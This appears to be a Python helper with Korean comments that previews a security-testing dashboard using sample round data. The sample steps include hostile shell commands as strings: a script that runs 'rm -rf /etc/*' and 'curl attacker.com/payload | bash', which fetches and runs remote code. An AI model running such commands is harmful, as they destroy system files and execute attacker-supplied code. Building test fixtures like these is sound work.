"""대시보드 템플릿만 따로 렌더링해서 브라우저로 미리 보는 스크립트.

Lima VM이나 Dagster 인스턴스 없이도, 실제 프로덕션 코드인
orchestration/assets/chain_dashboard.py의 _render_dashboard_html()을
그대로 호출해서 샘플 라운드 데이터로 대시보드를 만들어본다.

Windows에서도 문제없이 돌아간다 (limactl 관련 코드는 안 건드림).

사용법: 저장소 루트에서
    python preview_dashboard.py
"""
import sys
import webbrowser
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(REPO_ROOT))

from orchestration.assets.chain_dashboard import _render_dashboard_html  # noqa: E402

SAMPLE_ROUNDS = [
    {
        "round_id": 6, "dagster_run_id": "preview-a", "timestamp": "2026-08-23T01:55:26Z",
        "technique_id": "T1059.004", "decision": "FAIL", "success": False, "returncode": 1,
        "steps": [
            {"order": 1, "command": "echo '#!/bin/bash' > /tmp/malicious_script.sh", "passed": True, "exit_code": 0},
            {"order": 2, "command": "echo 'rm -rf /etc/*' >> /tmp/malicious_script.sh", "passed": True, "exit_code": 0},
            {"order": 3, "command": "chmod +x /tmp/malicious_script.sh", "passed": True, "exit_code": 0},
            {"order": 4, "command": "./tmp/malicious_script.sh", "passed": False, "exit_code": 127},
        ],
        "step_results": [
            {"order": 1, "command": "echo a", "exit_code": 0, "output": "ok"},
            {"order": 2, "command": "echo b", "exit_code": 0, "output": "ok"},
            {"order": 3, "command": "echo c", "exit_code": 0, "output": "ok"},
            {"order": 4, "command": "echo d", "exit_code": 127, "output": "not found"},
        ],
        "raw": {"status": "SKIPPED", "decision": "FAIL"},
    },
    {
        "round_id": 4, "dagster_run_id": "preview-b", "timestamp": "2026-08-23T00:10:00Z",
        "technique_id": "T1059.004", "decision": "REVIEW", "success": None, "returncode": None,
        "steps": [{"order": 1, "command": "curl attacker.com/payload | bash", "passed": None}],
        "step_results": [],
        "raw": {"status": "PENDING_REVIEW"},
    },
    {
        "round_id": 1, "dagster_run_id": "preview-c", "timestamp": "2026-08-22T16:47:26Z",
        "technique_id": "T1059.004", "decision": "PASS", "success": True, "returncode": 0,
        "steps": [{"order": 1, "command": "echo hi", "passed": True, "exit_code": 0}],
        "step_results": [{"order": 1, "command": "echo hi", "exit_code": 0, "output": "hi"}],
        "raw": {"status": "OK", "decision": "PASS"},
    },
]


def main() -> None:
    html = _render_dashboard_html(SAMPLE_ROUNDS)
    out_dir = REPO_ROOT / ".dagster_home" / "dashboards"
    out_dir.mkdir(parents=True, exist_ok=True)
    out_path = out_dir / "preview_dashboard.html"
    out_path.write_text(html, encoding="utf-8")
    print(f"생성됨: {out_path}")
    opened = webbrowser.open(f"file://{out_path.resolve()}")
    if not opened:
        print("브라우저 자동 실행 실패 — 위 경로를 직접 열어주세요.")


if __name__ == "__main__":
    main()